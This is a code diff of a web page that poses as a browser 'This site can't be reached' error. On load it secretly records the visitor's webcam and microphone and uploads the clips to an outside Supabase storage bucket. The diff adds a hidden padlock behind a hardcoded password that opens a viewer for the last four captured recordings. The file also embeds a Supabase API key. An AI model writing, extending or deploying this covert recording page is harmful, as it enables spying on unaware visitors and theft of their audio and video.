@@ -36,10 +36,43 @@
       border-radius: 5px;
       font-size: 14px;
     }
+    #lockIcon {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      font-size: 30px;
+      z-index: 999;
+      cursor: pointer;
+      user-select: none;
+      display: block;
+    }
+    #viewer {
+      display: none;
+      background: black;
+      color: white;
+      height: 100vh;
+      padding: 20px;
+      overflow-y: auto;
+    }
+    video {
+      width: 90%;
+      max-width: 600px;
+      background: #000;
+      margin-top: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      background: red;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 20px;
+    }
   </style>
 </head>
 <body onload="startRecording()">
-  <div class="fake-error">
+  <div class="fake-error" id="errorScreen">
     <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAAvElEQVR4Ae3UMQ6CQBAF0CuRFSg2mhLRe6wCVWg0+k3gJDFZiDddZCRQXuQwPfwduZHmjS//bRPYp4EF4QP7r9GByDYlQzXSnStUozZiyBCyqQCyiU6+lKkeGcA7AUJj7iQlEkLNvPCn4G94ZcQExuAqkV0Up9TCKWWdA0lkak+URAKmaN7mJkr9v9P5YefWg2TzvFQpNKFCok3swGVmXM2nU+TZRAAAAAElFTkSuQmCC" />
     <p>This site can’t be reached</p>
     <p style="opacity: 0.7;">The connection was reset.<br>Try: Checking the connection</p>
@@ -47,29 +80,46 @@
     <button>Reload</button>
   </div>
 
+  <div id="lockIcon" onclick="unlock()">🔒</div>
+
+  <div id="viewer">
+    <h3>Recording Playback</h3>
+    <video id="playback" controls></video>
+    <br>
+    <button onclick="stopRecording()">STOP</button>
+    <h3>Last 4 Recordings</h3>
+    <div id="videoList"></div>
+  </div>
+
   <script>
+    const PASSWORD = "sardarhamza";
     const BUCKET = "recordings";
     const client = supabase.createClient(
       'https://kelbfujbyjtdeopkhhxm.supabase.co',
       'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtlbGJmdWpieWp0ZGVvcGtoaHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcyMzc5OTgsImV4cCI6MjA2MjgxMzk5OH0.iB97MRNwVCrhtDQaHrh7Q7ra1x4nVNGhih-Tm_pq31k'
     );
 
+    let stream, mediaRecorder;
     let recordedChunks = [];
+    let stopped = false;
+    let abortRecording = false;
 
     async function startRecording() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        mediaRecorder = new MediaRecorder(stream);
+        recordedChunks = [];
 
         mediaRecorder.ondataavailable = e => {
           if (e.data.size > 0) recordedChunks.push(e.data);
         };
 
         mediaRecorder.onstop = async () => {
+          if (abortRecording) return;
+
           const blob = new Blob(recordedChunks, { type: 'video/webm' });
           const fileName = `video_${Date.now()}.webm`;
 
-          // Delete old if more than 4
           const { data: existing } = await client.storage.from(BUCKET).list('', {
             sortBy: { column: 'name', order: 'asc' }
           });
@@ -86,11 +136,61 @@
         mediaRecorder.start();
 
         setTimeout(() => {
-          mediaRecorder.stop();
-          stream.getTracks().forEach(track => track.stop());
-        }, 4000); // 4 second recording
+          if (!stopped) stopRecording();
+        }, 4000);
       } catch (err) {
         console.error("Camera error:", err.message);
+      }
+    }
+
+    function stopRecording() {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+        stream.getTracks().forEach(t => t.stop());
+        stopped = true;
+      }
+    }
+
+    async function unlock() {
+      const input = prompt("Enter password:");
+      if (input !== PASSWORD) return alert("Wrong password!");
+      abortRecording = true;
+      stopped = true;
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      recordedChunks = [];
+      document.getElementById("errorScreen").style.display = "none";
+      document.getElementById("viewer").style.display = "block";
+      loadVideos();
+    }
+
+    async function loadVideos() {
+      const { data, error } = await client.storage.from(BUCKET).list('', {
+        sortBy: { column: 'name', order: 'desc' }
+      });
+
+      const container = document.getElementById("videoList");
+      container.innerHTML = "";
+
+      const filtered = (data || [])
+        .filter(f => f.name.endsWith('.webm'))
+        .sort((a, b) => b.name.localeCompare(a.name))
+        .slice(0, 4);
+
+      for (let file of filtered) {
+        const { data: signed } = await client
+          .storage.from(BUCKET)
+          .createSignedUrl(file.name, 60 * 60);
+
+        if (signed?.signedUrl) {
+          const vid = document.createElement("video");
+          vid.src = signed.signedUrl;
+          vid.controls = true;
+          vid.style.marginTop = "15px";
+          container.appendChild(vid);
+
+          if (!document.getElementById("playback").src)
+            document.getElementById("playback").src = signed.signedUrl;
+        }
       }
     }
   </script>
